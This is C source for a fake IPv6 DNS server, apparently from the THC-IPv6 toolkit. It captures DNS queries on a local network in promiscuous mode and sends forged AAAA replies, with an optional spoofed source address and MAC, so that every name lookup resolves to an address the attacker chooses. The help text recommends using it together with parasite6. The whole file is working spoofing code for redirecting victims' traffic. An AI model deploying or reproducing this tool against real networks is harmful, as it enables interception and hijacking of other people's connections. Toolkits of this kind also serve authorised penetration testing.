#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/select.h>
#include "thc-ipv6.h"

char  mybuf[1024], mybuf2[28], *interface, lookup[256];
int   mlen, rawmode = 0;
char *mac6, *ip6;

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface ipv6-address [fake-ipv6-address [fake-mac]]\n",
         prg);
  printf(
      "Fake DNS server that serves the same IPv6 address to any lookup "
      "request\n");
  printf(
      "You can use this together with parasite6 if clients have a fixed DNS "
      "server\n");
  printf(
      "Note: very simple server. Does not honor multiple queries in a packet, "
      "nor");
  printf("NS, MX, etc. lookups.\n");
  exit(-1);
}

void check_packets(u_char *foo, const struct pcap_pkthdr *header,
                   const unsigned char *data) {
  unsigned char *ptr = (unsigned char *)data, *ptr2, *ptr3, *dst6, *src6,
                *dmac = NULL, *pkt, *look, *lwrite = lookup;
  unsigned short int sport, dport;
  int                len = header->caplen, plen = mlen, pkt_len;

  if (!rawmode) {
    if (do_hdr_size) {
      len -= do_hdr_size;
      ptr += do_hdr_size;
      if ((ptr[0] & 240) != 0x60) return;
      // dmac is ignored anyway
    } else {
      dmac = ptr + 6;
      len -= 14;
      ptr += 14;
    }
  }

  if (len < 70 || len > 800 || ptr[50] >= 128) return;

  look = ptr + 61;
  mybuf[0] = ptr[48];  // copy txid
  mybuf[1] = ptr[49];
  sport = ptr[42] * 256 + ptr[43];
  dport = ptr[40] * 256 + ptr[41];
  src6 = ptr + 24;
  dst6 = ptr + 8;
  memcpy(mybuf + plen, ptr + 60, len - 60);
  plen += (len - 60);
  memcpy(mybuf + plen, mybuf2, sizeof(mybuf2));
  plen += sizeof(mybuf2);

  if (src6[0] == 0xff &&
      src6[1] < 16)  // if the original dst is not a multicast address
    src6 = ip6;      // then use this as a spoofed source

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src6,
                                      dst6, 0, 0, 0, 0, 0)) == NULL)
    return;
  if (thc_add_udp(pkt, &pkt_len, sport, dport, 0, mybuf, plen) < 0) return;
  thc_generate_and_send_pkt(interface, mac6, dmac, pkt, &pkt_len);

  do {
    if (*look > 0 && *look < '0')
      *lwrite = '.';
    else
      *lwrite = *look;
    look++;
    lwrite++;
  } while (*look != 0 && look <= ptr + len - 4 && look <= ptr + 255 + 60);
  *lwrite = 0;
  ptr2 = thc_ipv62notation(dst6);
  ptr3 = thc_ipv62notation(src6);
  printf("Spoofed %s to %s as source %s\n", lookup, ptr2, ptr3);
  free(ptr2);
  free(ptr3);
}

int main(int argc, char *argv[]) {
  char    mac[16] = "", *routerip6, *ptr;
  pcap_t *p;

  /*  char rdatabuf[1024], wdatabuf[1024], cmsgbuf[1024]; */
  //  int size, i, j, k, l, m, s, len, t, u, csize = 0;

  /*  socklen_t fromlen;
    static struct iovec iov;
    struct sockaddr_storage from;
    struct msghdr mhdr;
    struct sockaddr_in6 ddst;
    unsigned long long int count = 0;*/

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {  // is ignored
    argv++;
    argc--;
    thc_ipv6_rawmode(1);
    rawmode = 1;
  }

  memset(mac, 0, sizeof(mac));
  mac6 = mac;
  interface = argv[1];
  if (argc >= 5 && (ptr = argv[4]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (argc >= 4 && argv[3] != NULL)
    ip6 = thc_resolve6(argv[3]);
  else
    ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);

  if (mac6 == NULL || ip6 == NULL) {
    fprintf(stderr, "Error: invalid interface %s or invalid src mac/IP set\n",
            interface);
    exit(-1);
  }

  routerip6 = thc_resolve6(argv[2]);

  if (routerip6 == NULL) {
    fprintf(stderr, "Error: fake IPv6 answer option is invalid: %s\n", argv[2]);
    exit(-1);
  }
  if (ip6 == NULL) {
    fprintf(stderr, "Error: fake answer IPv6 argument is invalid: %s\n",
            argv[3]);
    exit(-1);
  }
  if (mac6 == NULL) {
    fprintf(stderr, "Error: mac address in invalid\n");
    exit(-1);
  }

  if ((p = thc_pcap_init_promisc(
           interface, "ip6 and udp and (dst port 53 or dst port 5353)")) ==
      NULL) {
    fprintf(stderr, "Error: could not open interface %s in promisc mode\n",
            interface);
    exit(-1);
  }

  /*
    if ((s = thc_bind_udp_port(53)) < 0) {
      fprintf(stderr, "Warning: could not bind to 53/udp\n");
    } else {
      thc_bind_multicast_to_socket(s, interface, thc_resolve6("ff02::1:3"));
      fcntl(s, F_SETFL, O_NONBLOCK);
    }
    if ((t = thc_bind_udp_port(5353)) < 0) {
      fprintf(stderr, "Error: could not bind to 5353/udp\n");
      exit(-1);
    } else {
      thc_bind_multicast_to_socket(t, interface, thc_resolve6("ff02::1:3"));
      fcntl(t, F_SETFL, O_NONBLOCK);
    }
    if ((u = socket(AF_INET6, SOCK_DGRAM, 0)) < 0) {
      perror("Error:");
      exit(-1);
    }
  */

  memset(mybuf, 0, sizeof(mybuf));
  mybuf[2] = 0x81;  // flags
  mybuf[3] = 0x80;
  mybuf[5] = 1;  // queries
  mybuf[7] = 1;  // replies
  // no RRs, no add R
  mlen = 12;

  memset(mybuf2, 0, sizeof(mybuf2));
  mybuf2[0] = 0xc0;  // name
  mybuf2[1] = 0x0c;
  mybuf2[3] = 0x1c;   // type aaaa
  mybuf2[5] = 0x01;   // class IN
  mybuf2[8] = 0x04;   // ttl (1024 seconds == 0x00000400)
  mybuf2[11] = 0x10;  // length 16
  memcpy(mybuf2 + 12, routerip6, 16);

  printf(
      "Starting fake dns6 server on %s for %s (Press Control-C to end) ...\n\n",
      interface, argv[2]);

  while (1)
    thc_pcap_check(p, (char *)check_packets, NULL);

  /*
     while(1) {
     memset((char*)&from, 0, sizeof(from));
     memset(&iov, 0, sizeof(iov));
     memset(&mhdr, 0, sizeof(mhdr));
     iov.iov_base = rdatabuf;
     iov.iov_len = sizeof(rdatabuf);
     mhdr.msg_name = &from;
     mhdr.msg_namelen = sizeof(from);
     mhdr.msg_iov = &iov;
     mhdr.msg_iovlen = 1;
     mhdr.msg_control = (caddr_t)cmsgbuf;
     mhdr.msg_controllen = sizeof(cmsgbuf);
     if ( (s >= 0 && (len = recvmsg(s, &mhdr, 0)) > 0) || (t >= 0 && (len =
     recvmsg(t, &mhdr, 0)) > 0)) { fromlen = mhdr.msg_namelen; if (debug)
     thc_dump_data(rdatabuf, len, "Received Packet");
     ddst.sin6_addr = ((struct sockaddr_in6 *)mhdr.msg_name)->sin6_addr;
     ptr2 = thc_ipv62notation((char*)&ddst.sin6_addr);
     // data in rdatabuf, ipv6string in ptr2
     // .
     // .
     } else
     usleep(200);
     }
   */

  return 0;  // never reached
}
